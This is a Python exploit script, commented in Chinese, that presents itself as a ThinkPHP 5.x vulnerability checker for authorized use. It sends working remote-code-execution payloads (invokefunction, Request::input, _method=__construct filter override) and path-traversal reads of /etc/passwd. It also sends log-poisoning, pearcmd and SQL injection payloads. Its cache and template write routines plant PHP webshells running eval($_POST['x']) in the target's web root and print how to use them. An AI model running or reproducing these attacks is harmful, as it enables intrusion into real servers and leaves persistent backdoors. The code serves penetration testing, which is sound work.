#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ThinkPHP 5.x 综合漏洞检测脚本 v2.0
覆盖 ThinkPHP 5.0.x ~ 5.1.x 三大攻击面 + 新增 CVE
仅用于授权安全测试 / 靶场验证

攻击面 A — 未强制路由 RCE:
  invokefunction / Request::input / Container / 模板写入 / 文件包含
攻击面 B — _method=__construct 变量覆盖 RCE:
  POST filter 注入 (debug/captcha/无限制 三种路径)
攻击面 C — 多语言 RCE (2024):
  通过 lang 参数 pearcmd 文件包含

CVE 覆盖:
  CVE-2018-25270   - invokefunction 路由 RCE
  CVE-2025-63888   - 模板驱动 File.php read() 文件包含 RCE
  CVE-2025-50706   - 5.1 routecheck 路径穿越/代码注入 RCE
  无 CVE           - __construct 变量覆盖 RCE
  无 CVE           - 缓存驱动任意文件写入
  无 CVE           - parseOrder SQL 注入
  无 CVE           - 多语言 pearcmd RCE
"""

import requests
import sys
import argparse
import re
import random
import string
import time
import urllib.parse
from typing import Optional, Tuple, List, Dict

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ===================== 工具函数 =====================

class C:
    """终端颜色"""
    GRN = '\033[92m'
    RED = '\033[91m'
    YLW = '\033[93m'
    BLU = '\033[94m'
    CYN = '\033[96m'
    RST = '\033[0m'
    BLD = '\033[1m'


def safe_print(*args, **kwargs):
    """绕过 Windows GBK 终端编码问题"""
    try:
        print(*args, **kwargs)
    except UnicodeEncodeError:
        for a in args:
            try:
                print(a, **kwargs)
            except UnicodeEncodeError:
                enc = sys.stdout.encoding or 'utf-8'
                print(str(a).encode(enc, errors='replace').decode(enc, errors='replace'), **kwargs)


def banner():
    safe_print(f"""
{C.RED}╔══════════════════════════════════════════════════════════════╗
║     ThinkPHP 5.x 综合漏洞检测工具 v2.0                        ║
║     三大攻击面 + 7 项 CVE 覆盖 | 仅限授权安全使用            ║
╚══════════════════════════════════════════════════════════════╝{C.RST}""")


def randstr(n: int = 8) -> str:
    return ''.join(random.choices(string.ascii_lowercase, k=n))


def build_url(base: str, path: str) -> str:
    return f"{base.rstrip('/')}/{path.lstrip('/')}"


def flag_match(resp: requests.Response, flag: str) -> Tuple[bool, str]:
    """检查 flag 是否出现在响应中，返回 (命中, 上下文片段)"""
    if flag in resp.text:
        idx = resp.text.find(flag)
        snippet = resp.text[max(0, idx - 15):idx + len(flag) + 100]
        return True, snippet.strip()
    return False, ""


def new_session(timeout: int = 10) -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,*/*',
    })
    s.timeout = timeout
    return s


def post_form(session: requests.Session, url: str, data: dict, timeout: int = 10) -> requests.Response:
    """带正确 Content-Type 的 POST 请求"""
    return session.post(url, data=data, timeout=timeout,
                        headers={'Content-Type': 'application/x-www-form-urlencoded'})


# ===================== 0. 指纹 / 版本检测 =====================

def detect_version(url: str, s: requests.Session) -> Tuple[bool, Optional[str]]:
    """通过触发报错获取 ThinkPHP 版本号"""
    safe_print(f"\n{C.YLW}[0] 指纹检测{C.RST}")

    # 触发错误页面
    triggers = [
        f"/index.php?s=/{randstr(10)}",
        f"/index.php?s=..{randstr(6)}",
        f"/?s={randstr(8)}",
    ]
    for trig in triggers:
        try:
            r = s.get(build_url(url, trig), timeout=8)
            text = r.text

            # 版本号匹配
            m = re.search(r'ThinkPHP\s*V?(\d+\.\d+(?:\.\d+)?)', text, re.IGNORECASE)
            if m:
                ver = m.group(1)
                safe_print(f"  {C.GRN}[+] ThinkPHP {ver}{C.RST}")
                return True, ver

            # 特征字符串
            for kw in ['thinkphp', 'trace]', 'class="trace', '/thinkphp/', '/vendor/topthink/']:
                if kw.lower() in text.lower():
                    safe_print(f"  {C.GRN}[+] 确认为 ThinkPHP (特征: {kw}){C.RST}")
                    return True, None

        except Exception:
            continue

    # 常规请求探测
    for p in ['/index.php', '/']:
        try:
            r = s.get(build_url(url, p), timeout=8)
            for h in ['X-Powered-By', 'Server']:
                if 'think' in r.headers.get(h, '').lower():
                    safe_print(f"  {C.GRN}[+] Header 含 ThinkPHP 痕迹{C.RST}")
                    return True, None
        except Exception:
            continue

    safe_print(f"  {C.CYN}[-] 未识别到 ThinkPHP 指纹 (将继续检测){C.RST}")
    return False, None


# ===================== 1. 攻击面A — 5.0.x 未强制路由 RCE =====================

def check_a_5_0_invoke(url: str, s: requests.Session) -> List[str]:
    """
    5.0.x invokefunction / 直接调用任意方法
    条件: 未开启强制路由 + 兼容模式
    版本: 5.0.5 ~ 5.0.23
    """
    safe_print(f"\n{C.YLW}[1] 攻击面A-5.0: invokefunction 路由 RCE{C.RST}")

    rk = randstr(6)
    cmd = f"echo {rk}"
    flag = rk
    hits = []

    payloads = [
        # invokefunction -> call_user_func_array -> system
        ("?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=" + urllib.parse.quote(cmd),
         "invoke→system", True),
        # 通杀路由格式
        ("?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=" + urllib.parse.quote(cmd),
         "通杀 invoke→system", True),
        # phpinfo 检测 (不依赖命令执行)
        ("?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
         "invoke→phpinfo", True),
        # 直接 system
        ("?s=index/\\think\\app/invokefunction&function=system&vars[0]=" + urllib.parse.quote(cmd),
         "invoke 直接 system", True),
        # assert 绕过
        ("?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=system('" + urllib.parse.quote(cmd) + "')",
         "invoke→assert→system", True),
        # file_put_contents 写 shell (仅检测不写入)
        ("?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1",
         "invoke 直接 phpinfo", True),
    ]

    for path, desc, reliable in payloads:
        try:
            # 兼容 ?s= 和 /index.php?s= 两种形式
            for prefix in ['/index.php', '']:
                r = s.get(build_url(url, prefix + path), timeout=10)
                ok, ctx = flag_match(r, flag)
                if ok or (desc.endswith('phpinfo') and 'PHP Version' in r.text):
                    safe_print(f"  {C.RED}[!] {desc} — 确认存在!{C.RST}")
                    hits.append(f"5.0.x {desc}")
                    break
                # phpinfo 检测
                if 'phpinfo' in desc.lower() and ('PHP Version' in r.text or 'phpinfo' in r.text.lower()):
                    safe_print(f"  {C.RED}[!] {desc} — 确认存在!{C.RST}")
                    hits.append(f"5.0.x {desc}")
                    break
        except Exception:
            continue

    if not hits:
        safe_print(f"  {C.CYN}[-] 未发现 5.0 invokefunction 漏洞{C.RST}")
    return hits


# ===================== 2. 攻击面A — 5.1.x 未强制路由 RCE =====================

def check_a_5_1_input(url: str, s: requests.Session) -> List[str]:
    """
    5.1.x Request::input / Container / template 写入 RCE
    条件: 未开启强制路由
    版本: 5.1.0 ~ 5.1.31
    """
    safe_print(f"\n{C.YLW}[2] 攻击面A-5.1: Request::input / Container RCE{C.RST}")

    rk = randstr(6)
    cmd = f"echo {rk}"
    flag = rk
    hits = []

    payloads = [
        # 5.1 Request::input 链 (最常用)
        ("?s=index/\\think\\Request/input&filter=system&data=" + urllib.parse.quote(cmd),
         "5.1 Request::input→system", True),
        # filter[] 数组形式
        ("?s=index/\\think\\Request/input&filter[]=system&data=" + urllib.parse.quote(cmd),
         "5.1 Request::input filter[]", True),
        # phpinfo
        ("?s=index/\\think\\Request/input&filter=phpinfo&data=1",
         "5.1 Request::input→phpinfo", True),
        # Container 链
        ("?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=" + urllib.parse.quote(cmd),
         "5.1 Container→system", True),
        # App invokefunction (5.1 兼容)
        ("?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=" + urllib.parse.quote(cmd),
         "5.1 App invoke→system", True),
        # template driver 写 shell -> RCE
        ("?s=index/\\think\\template\\driver\\file/write&cacheFile=" + rk + ".php&content=%3C%3Fphp%20echo%20'" + rk + "'%3Bsystem(\$_GET[1])%3B%20%3F%3E",
         "5.1 template 写入", False),
        # view driver Php display
        ("?s=index/\\think\\view\\driver\\Php/display&content=%3C%3Fphp%20echo%20'" + rk + "'%3B%20%3F%3E",
         "5.1 view→Php display", False),
        # 信息泄露 (无 RCE 但验证漏洞存在)
        ("?s=index/\\think\\config/get&name=database.username",
         "5.1 config 信息泄露", False),
    ]

    for path, desc, reliable in payloads:
        try:
            for prefix in ['/index.php', '']:
                r = s.get(build_url(url, prefix + path), timeout=10)
                # 命令执行检测
                ok, ctx = flag_match(r, flag)
                if ok:
                    safe_print(f"  {C.RED}[!] {desc} — 确认存在!{C.RST}")
                    hits.append(desc)
                    break
                # phpinfo 检测
                if 'phpinfo' in desc.lower() and ('PHP Version' in r.text or 'phpinfo' in r.text.lower()):
                    safe_print(f"  {C.RED}[!] {desc} — 确认存在!{C.RST}")
                    hits.append(desc)
                    break
                # 信息泄露检测
                if 'config' in desc and ('username' in r.text or 'password' in r.text or 'database' in r.text):
                    safe_print(f"  {C.RED}[!] {desc} — 确认存在! 回显: {r.text[:120]}{C.RST}")
                    hits.append(desc)
                    break
                # template 写入：尝试验证写入的 shell
                if 'template 写入' in desc:
                    verify = s.get(build_url(url, f"/{rk}.php?1=echo%20{rk}"), timeout=6)
                    if rk in verify.text:
                        safe_print(f"  {C.RED}[!] {desc} — shell 写入成功并可访问!{C.RST}")
                        hits.append(desc)
                        break
        except Exception:
            continue

    if not hits:
        safe_print(f"  {C.CYN}[-] 未发现 5.1 路由 RCE{C.RST}")
    return hits


# ===================== 3. 攻击面B — __construct 变量覆盖 RCE =====================

def check_b_construct_override(url: str, s: requests.Session) -> List[str]:
    """
    _method=__construct 覆盖 Request 类 filter 属性
    三条路径:
      a) 5.0.0~5.0.13 — 无敌模式，无需任何条件
      b) 5.0.14~5.0.23 — 需 debug=true
      c) 5.0.14~5.0.23 — 有 captcha 路由时无需 debug
      d) 5.1.0~5.1.16 — 需 debug=true
    """
    safe_print(f"\n{C.YLW}[3] 攻击面B: __construct 变量覆盖 RCE{C.RST}")

    rk = randstr(6)
    cmd = f"echo {rk}"
    flag = rk
    hits = []

    # 三组测试: (payload_data, target_path, label, is_reliable)
    tests = [
        # ===== 路径 a: 无敌模式 (5.0.0~5.0.13) =====
        # POST ?s=index/index  body: s=cmd&_method=__construct&method=&filter[]=system
        {
            'target': '/index.php?s=index/index',
            'data': {'s': cmd, '_method': '__construct', 'method': '', 'filter[]': 'system'},
            'label': 'b1-无敌模式 (≤5.0.13)',
            'vuln_ver': '5.0.0~5.0.13',
        },
        {
            'target': '/index.php?s=captcha',
            'data': {'_method': '__construct', 'filter[]': 'system', 'method': 'get', 'server[REQUEST_METHOD]': cmd},
            'label': 'b1-captcha 路由 (≤5.0.13)',
            'vuln_ver': '5.0.0~5.0.13',
        },
        # ===== 路径 b: debug=true (5.0.14~5.0.23) =====
        # POST /  body: _method=__construct&filter[]=system&server[REQUEST_METHOD]=cmd
        {
            'target': '/index.php',
            'data': {'_method': '__construct', 'filter[]': 'system', 'server[REQUEST_METHOD]': cmd},
            'label': 'b2-debug 模式 (5.0.14~23)',
            'vuln_ver': '5.0.14~5.0.23 (需 debug)',
        },
        {
            'target': '/index.php',
            'data': {'_method': '__construct', 'filter[]': 'system', 'method': 'get', 'get[]': cmd},
            'label': 'b2-debug GET 注入 (5.0.14~23)',
            'vuln_ver': '5.0.14~5.0.23 (需 debug)',
        },
        # ===== 路径 c: captcha 路由绕过 (无需 debug, 5.0.14~5.0.23) =====
        {
            'target': '/index.php?s=captcha',
            'data': {'_method': '__construct', 'filter[]': 'system', 'method': 'get', 'get[]': cmd},
            'label': 'b3-captcha 绕过 (5.0.14~23, 无需debug)',
            'vuln_ver': '5.0.14~5.0.23 (captcha路由)',
        },
        {
            'target': '/index.php?s=captcha',
            'data': {'_method': '__construct', 'filter[]': 'system', 'server[REQUEST_METHOD]': cmd, 'method': 'get'},
            'label': 'b3-captcha server 注入',
            'vuln_ver': '5.0.14~5.0.23 (captcha路由)',
        },
        # ===== 5.1.x 兼容 (需 debug) =====
        {
            'target': '/index.php',
            'data': {'_method': '__construct', 'filter[]': 'system', 'server[REQUEST_METHOD]': cmd},
            'label': 'b4-5.1 debug 模式 (≤5.1.16)',
            'vuln_ver': '5.1.0~5.1.16 (需 debug)',
        },
        # ===== 通用 captcha =====
        {
            'target': '/index.php?s=captcha',
            'data': {'_method': '__construct', 'filter[]': 'phpinfo', 'server[REQUEST_METHOD]': '1'},
            'label': 'b-captcha phpinfo 探针',
            'vuln_ver': '多个版本 (captcha路由)',
        },
    ]

    for t in tests:
        try:
            full_url = build_url(url, t['target'])
            r = post_form(s, full_url, t['data'], timeout=10)

            ok, ctx = flag_match(r, flag)
            if ok:
                safe_print(f"  {C.RED}[!] {t['label']} — 确认存在!{C.RST}")
                hits.append(f"__construct 覆盖 ({t['label']})")
                continue

            # phpinfo 变体检测
            if 'phpinfo' in str(t['data'].get('filter[]', '')) and 'PHP Version' in r.text:
                safe_print(f"  {C.RED}[!] {t['label']} — phpinfo 执行成功!{C.RST}")
                hits.append(f"__construct 覆盖 ({t['label']})")
                continue
        except Exception:
            continue

    if not hits:
        safe_print(f"  {C.CYN}[-] 未发现 __construct 变量覆盖漏洞{C.RST}")
    return hits


# ===================== 4. CVE-2025-63888 — 模板驱动文件包含 RCE =====================

def check_cve_2025_63888(url: str, s: requests.Session) -> List[str]:
    """
    CVE-2025-63888: thinkphp/library/think/template/driver/File.php read()
    攻击链: 路径穿越 + 日志投毒 + 文件包含
    影响: ThinkPHP 5.0.24 / 5.x
    注: 此 CVE 公开 PoC 有限，检测逻辑基于已知攻击模式
    """
    safe_print(f"\n{C.YLW}[4] CVE-2025-63888: 模板驱动文件包含 RCE{C.RST}")
    safe_print(f"  {C.CYN}    (PoC 有限，基于已知攻击模式检测){C.RST}")

    rk = randstr(6)
    cmd = f"echo {rk}"
    flag = rk
    hits = []

    # Step 1: 检测是否存在 view() 端点
    view_endpoints = [
        "/index.php?s=index/index/view",
        "/index.php?s=/index/index/view",
        "/index.php/index/index/view",
        "/index.php?s=index/index/index",
    ]

    view_found = False
    for ep in view_endpoints:
        try:
            r = s.get(build_url(url, ep), timeout=8)
            if r.status_code == 200 and len(r.text) > 100:
                view_found = True
                break
        except Exception:
            continue

    # Step 1b: 尝试用模板路径穿越读取 /etc/passwd (Linux) 或 C:\Windows\win.ini (Win)
    traverse_payloads = [
        ("/index.php?s=index/\\think\\template\\driver\\File/read&file=../../../../../../../../etc/passwd",
         "root:", "Linux /etc/passwd"),
        ("/index.php?s=index/\\think\\template\\driver\\File/read&file=../../../../../../../../Windows/win.ini",
         "[fonts]", "Windows win.ini"),
        ("/index.php?s=index/\\think\\view\\driver\\Think/display&template=../../../../../../../../etc/passwd",
         "root:", "view display 路径穿越"),
        ("/index.php?s=index/\\think\\view\\driver\\Think/fetch&template=../../../../../../../../etc/passwd",
         "root:", "view fetch 路径穿越"),
    ]

    for path, expected, desc in traverse_payloads:
        try:
            r = s.get(build_url(url, path), timeout=10)
            if expected in r.text:
                safe_print(f"  {C.RED}[!] 路径穿越成功 — {desc}!{C.RST}")
                safe_print(f"  {C.RED}    回显: {r.text[:150]}{C.RST}")
                hits.append(f"CVE-2025-63888 路径穿越 ({desc})")
        except Exception:
            continue

    # Step 2: 尝试日志投毒 + 包含
    # 先向日志写入 PHP payload (通过触发带有 PHP 代码的 404 等)
    log_php = f"<?php echo '{flag}'; ?>"
    poison_urls = [
        f"/index.php?s=/{log_php}",
        f"/{randstr(4)}<?php%20echo%20'{flag}'%3B%20?>",
    ]
    for p_url in poison_urls:
        try:
            s.get(build_url(url, p_url), timeout=6)
        except Exception:
            pass

    # 尝试包含可能被投毒的日志文件
    log_paths = [
        f"/index.php?s=index/\\think\\template\\driver\\File/read&file=../runtime/log/{time.strftime('%Y%m')}/{time.strftime('%d')}.log",
        f"/index.php?s=index/\\think\\template\\driver\\File/read&file=../runtime/log/{time.strftime('%Y%m')}/{int(time.strftime('%d')) - 1}.log",
        f"/index.php?s=index/\\think\\view\\driver\\Think/display&template=../runtime/log/{time.strftime('%Y%m')}/{time.strftime('%d')}.log",
    ]
    for lpath in log_paths:
        try:
            r = s.get(build_url(url, lpath), timeout=10)
            if flag in r.text:
                safe_print(f"  {C.RED}[!] 日志投毒+包含成功! (CVE-2025-63888){C.RST}")
                hits.append("CVE-2025-63888 日志投毒+文件包含")
                break
        except Exception:
            continue

    if not hits:
        safe_print(f"  {C.CYN}[-] 未确认 CVE-2025-63888 (可能目标版本不符或路由不同){C.RST}")
    return hits


# ===================== 5. CVE-2025-50706 — 5.1 routecheck RCE =====================

def check_cve_2025_50706(url: str, s: requests.Session) -> List[str]:
    """
    CVE-2025-50706: ThinkPHP 5.1 routecheck 路径穿越 / 代码注入
    CWE-94 + CWE-22, CVSS 9.8, 关联 CNVD-2024-29981
    影响: ThinkPHP 5.1.x (topthink/framework ≤ 5.1.41)
    注: 具体路由依赖应用实现
    """
    safe_print(f"\n{C.YLW}[5] CVE-2025-50706: 5.1 routecheck 路径穿越/代码注入{C.RST}")
    safe_print(f"  {C.CYN}    (具体触发路径依赖应用实现，多 payload 覆盖){C.RST}")

    rk = randstr(6)
    cmd = f"echo {rk}"
    flag = rk
    hits = []

    # 5.1 文件包含 / 路径穿越 payloads
    payloads = [
        # route 路径穿越 → 文件包含
        ("/index.php?s=index/\\think\\route/dispatch&file=../../../../../../../../etc/passwd",
         "root:", "route 路径穿越 /etc/passwd", 'GET', None),
        # Lang 文件包含 (5.1 通杀)
        ("/index.php?s=index/\\think\\Lang/load&file=../../test.jpg",
         "", "Lang 文件包含", 'GET', None),
        # Config load 文件包含
        ("/index.php?s=index/\\think\\Config/load&file=../../test.php",
         "", "Config 文件包含", 'GET', None),
        # 5.1 Container → 直接 RCE (作为 routecheck 绕过)
        ("/index.php?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=" + urllib.parse.quote(cmd),
         flag, "5.1 Container RCE (route bypass)", 'GET', None),
        # 5.1 双 s 参数绕过
        ("/index.php?s=index/index/index&s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=" + urllib.parse.quote(cmd),
         flag, "5.1 双参数路由绕过 RCE", 'GET', None),
        # POST 路由检查绕过
        ("/index.php?=PHPFILTER", "", "5.1 PHP filter 链", 'POST',
         {'s': f'index/\\think\\Request/input&filter=system&data={cmd}'}),
    ]

    for path, expected, desc, method, data in payloads:
        try:
            full_url = build_url(url, path)
            r = s.get(full_url, timeout=10) if method == 'GET' else post_form(s, full_url, data or {}, timeout=10)

            ok, ctx = flag_match(r, flag if expected == flag else expected)
            if ok or (expected and expected in r.text):
                safe_print(f"  {C.RED}[!] {desc} — 确认存在!{C.RST}")
                if expected in r.text and expected != flag:
                    safe_print(f"  {C.RED}    回显: {r.text[:150]}{C.RST}")
                hits.append(f"CVE-2025-50706 ({desc})")
        except Exception:
            continue

    if not hits:
        safe_print(f"  {C.CYN}[-] 未确认 CVE-2025-50706 (具体路由可能不同){C.RST}")
    return hits


# ===================== 6. 缓存文件写入 Getshell =====================

def check_cache_getshell(url: str, s: requests.Session) -> List[str]:
    """
    利用 \think\cache\driver\File 写入任意文件
    配合路径穿越写 webshell 到 web 根目录
    版本: 5.0.x (5.1.x 也有类似问题)
    """
    safe_print(f"\n{C.YLW}[6] Cache 文件写入 Getshell{C.RST}")

    rk = randstr(6)
    shell_name = f"c_{rk}.php"
    flag = randstr(10)
    hits = []

    # 多种写入方法
    write_payloads = [
        # 方法1: cache set 写入
        {
            'write': f"/index.php?s=index/\\think\\cache\\driver\\file/set&name=../{shell_name}&value=%3C%3Fphp%20echo%20'{flag}'%3Beval(\$_POST['x'])%3B%3F%3E",
            'verify_paths': [f'/{shell_name}', f'/public/{shell_name}'],
        },
        # 方法2: template write
        {
            'write': f"/index.php?s=index/\\think\\template\\driver\\file/write&cacheFile=../{shell_name}&content=%3C%3Fphp%20echo%20'{flag}'%3Beval(\$_POST['x'])%3B%3F%3E",
            'verify_paths': [f'/public/{shell_name}', f'/{shell_name}'],
        },
        # 方法3: view display 写 runtime/temp (大概率不在 web root, 但记录路径)
        {
            'write': f"/index.php?s=index/\\think\\view\\driver\\Php/display&content=%3C%3Fphp%20echo%20'{flag}'%3Beval(\$_POST['x'])%3B%20%3F%3E",
            'verify_paths': [],  # 不验证，路径不可预测
        },
    ]

    for wp in write_payloads:
        try:
            s.get(build_url(url, wp['write']), timeout=10)

            # 尝试验证 shell 是否可访问
            for vp in wp['verify_paths']:
                try:
                    r = s.get(build_url(url, vp), timeout=8)
                    if flag in r.text:
                        safe_print(f"  {C.RED}[!] Webshell 写入成功!{C.RST}")
                        safe_print(f"  {C.RED}    Shell URL: {build_url(url, vp)}{C.RST}")
                        safe_print(f"  {C.RED}    POST x=system('id') 即可执行命令{C.RST}")
                        hits.append(f"Cache 写入 Getshell ({vp})")
                        break
                except Exception:
                    continue
        except Exception:
            continue

    if not hits:
        safe_print(f"  {C.CYN}[-] 未成功写入 webshell (可能目录无写权限或路径不对){C.RST}")
    return hits


# ===================== 7. 多语言 RCE (2024 披露) =====================

def check_lang_rce(url: str, s: requests.Session) -> List[str]:
    """
    2024 年披露的多语言 RCE
    条件: lang_switch_on = true
    影响: ThinkPHP 5.0.x / 5.1.x / 6.0.1~6.0.13
    利用 pearcmd.php 注册 register_argc_argv 实现文件包含
    """
    safe_print(f"\n{C.YLW}[7] 多语言 pearcmd RCE (2024 披露){C.RST}")

    rk = randstr(6)
    flag = randstr(8)
    hits = []

    # 检测多语言是否开启
    lang_probes = [
        ("/index.php?lang=../../../../../public/index", "lang GET 探测"),
    ]
    for probe, desc in lang_probes:
        try:
            r = s.get(build_url(url, probe), timeout=10)
            # 如果返回 200 且不是 404，可能开启了多语言
            if r.status_code == 200 and len(r.text) > 50:
                safe_print(f"  {C.GRN}[+] 多语言功能疑似开启 (GET 方式){C.RST}")
                break
        except Exception:
            continue

    # pearcmd 文件包含链
    pear_payloads = [
        # GET 方式
        "/index.php?+config+create+/<?=system('id');die;?>+/tmp/evil.php",
        # lang 参数方式
        "/index.php?lang=../../../../../../../../tmp/evil",
        # Header 方式
        # (用 headers 测试)
    ]

    for pp in pear_payloads:
        try:
            r = s.get(build_url(url, pp), timeout=10)
            if r.status_code == 200:
                safe_print(f"  {C.GRN}[+] pearcmd payload 已发送, 检查是否创建 shell{C.RST}")
        except Exception:
            continue

    # 尝试访问常见 pearcmd 注册 shell 路径
    shell_checks = [
        "/tmp/evil.php",
        "/evil.php",
    ]
    for sp in shell_checks:
        try:
            r = s.get(build_url(url, sp), timeout=8)
            if r.status_code == 200 and len(r.text) > 0:
                safe_print(f"  {C.RED}[!] pearcmd webshell 可能已创建: {sp}{C.RST}")
                hits.append(f"多语言 RCE ({sp})")
        except Exception:
            continue

    if not hits:
        safe_print(f"  {C.CYN}[-] 未确认多语言 RCE (可能未开启该功能){C.RST}")
    return hits


# ===================== 8. SQL 注入 (parseOrder) =====================

def check_sql_injection(url: str, s: requests.Session) -> List[str]:
    """
    ThinkPHP 5.x Builder.php parseOrder SQL 注入
    影响: 5.0.x ≤ 5.1.22
    使用延时基线对比降低误报
    """
    safe_print(f"\n{C.YLW}[8] parseOrder SQL 注入{C.RST}")

    # 先测基线延时
    try:
        t0 = time.time()
        s.get(build_url(url, '/index.php'), timeout=10)
        baseline = time.time() - t0
    except Exception:
        baseline = 0.5

    hits = []

    order_payloads = [
        # 报错注入 (extractvalue/updatexml)
        "/index.php?order[id`|updatexml(1,concat(0x7e,(select%20database())),1)%23]=1",
        "/index.php?order[id`|extractvalue(1,concat(0x7e,(select%20database())))%23]=1",
        # orderby 注入 (5.1 格式)
        "/index.php?s=/index/index/index&orderby[id|updatexml(1,concat(0x7e,(select%20database())),0)%23]=1",
        # 延时注入 (用于无回显场景)
        "/index.php?order[id`|if(1=1,sleep(3),0)%23]=1",
        # 5.0.x 格式
        "/index.php?s=index/index/index&order[id`|updatexml(1,concat(0x7e,(select%20database())),1)%23]=1",
        # 双 order 参数
        "/index.php?order[id|1%23]=1&order[id|updatexml(1,concat(0x7e,(select%20database())),1)%23]=1",
    ]

    for op in order_payloads:
        try:
            t_start = time.time()
            r = s.get(build_url(url, op), timeout=12)
            elapsed = time.time() - t_start

            # 报错回显检测
            err_indicators = ['XPATH', 'updatexml', 'extractvalue', 'syntax error', 'xp_dirtree',
                              'SQLSTATE', 'mysql', 'database()', 'Duplicate entry']
            for ei in err_indicators:
                if ei.lower() in r.text.lower():
                    safe_print(f"  {C.RED}[!] SQL 注入确认 — 报错回显 ({ei}){C.RST}")
                    safe_print(f"  {C.RED}    回显: {r.text[:200]}{C.RST}")
                    hits.append("parseOrder SQL 注入 (报错回显)")
                    return hits

            # 延时检测 (比基线多 2s 以上视为异常)
            if elapsed > baseline + 2.0:
                safe_print(f"  {C.RED}[!] SQL 注入确认 — 延时 {elapsed:.1f}s (基线 {baseline:.1f}s){C.RST}")
                hits.append("parseOrder SQL 注入 (延时)")
                return hits

        except Exception:
            continue

    if not hits:
        safe_print(f"  {C.CYN}[-] 未发现 SQL 注入 (基线延时 {baseline:.1f}s){C.RST}")
    return hits


# ===================== 主流程 =====================

def main():
    banner()

    parser = argparse.ArgumentParser(
        description='ThinkPHP 5.x 综合漏洞检测工具 v2.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
使用示例:
  python thinkphp5_check.py -u http://192.168.1.100:8080
  python thinkphp5_check.py -u http://target.com --rce-only
  python thinkphp5_check.py -u http://target.com --timeout 15 --no-color
        ''',
    )
    parser.add_argument('-u', '--url', required=True, help='目标 URL')
    parser.add_argument('--rce-only', action='store_true', help='仅检测 RCE，跳过 SQL 注入')
    parser.add_argument('--skip-low-confidence', action='store_true', help='跳过置信度较低的检测 (CVE-2025-63888/50706/多语言)')
    parser.add_argument('--timeout', type=int, default=10, help='请求超时秒数 (默认 10)')
    parser.add_argument('--no-color', action='store_true', help='禁用彩色输出')
    args = parser.parse_args()

    if args.no_color:
        for attr in dir(C):
            if not attr.startswith('_'):
                setattr(C, attr, '')

    url = args.url.rstrip('/')
    s = new_session(args.timeout)

    safe_print(f"{C.BLD}目标: {url}{C.RST}")

    # === 0. 指纹 ===
    is_tp, version = detect_version(url, s)

    # === 全部命中记录 ===
    all_hits: List[str] = []

    # === 1. 攻击面A-5.0 ===
    all_hits.extend(check_a_5_0_invoke(url, s))

    # === 2. 攻击面A-5.1 ===
    all_hits.extend(check_a_5_1_input(url, s))

    # === 3. 攻击面B __construct ===
    all_hits.extend(check_b_construct_override(url, s))

    # === 4. CVE-2025-63888 ===
    if not args.skip_low_confidence:
        all_hits.extend(check_cve_2025_63888(url, s))
    else:
        safe_print(f"\n{C.CYN}[4-5,7] 已跳过低置信度检测{C.RST}")

    # === 5. CVE-2025-50706 ===
    if not args.skip_low_confidence:
        all_hits.extend(check_cve_2025_50706(url, s))

    # === 6. Cache Getshell ===
    all_hits.extend(check_cache_getshell(url, s))

    # === 7. 多语言 RCE ===
    if not args.skip_low_confidence:
        all_hits.extend(check_lang_rce(url, s))

    # === 8. SQL 注入 ===
    if not args.rce_only:
        sql_hits = check_sql_injection(url, s)
        all_hits.extend(sql_hits)

    # ========== 汇总 ==========
    safe_print(f"\n\n{C.BLU}{'=' * 60}{C.RST}")
    safe_print(f"{C.BLD}检测结果汇总{C.RST}")
    safe_print(f"{C.BLU}{'=' * 60}{C.RST}")
    safe_print(f"  目标 : {url}")
    if version:
        safe_print(f"  版本 : ThinkPHP {version}")

    if all_hits:
        safe_print(f"\n  {C.RED}{C.BLD}共发现 {len(all_hits)} 个漏洞:{C.RST}")
        for h in all_hits:
            safe_print(f"    {C.RED}[!] {h}{C.RST}")
    else:
        safe_print(f"\n  {C.CYN}未检测到可利用漏洞{C.RST}")
        safe_print(f"  {C.CYN}(可能已修复 / 版本不符 / 路由模式不同 / 非 ThinkPHP){C.RST}")

    safe_print(f"{C.BLU}{'=' * 60}{C.RST}\n")


if __name__ == '__main__':
    main()
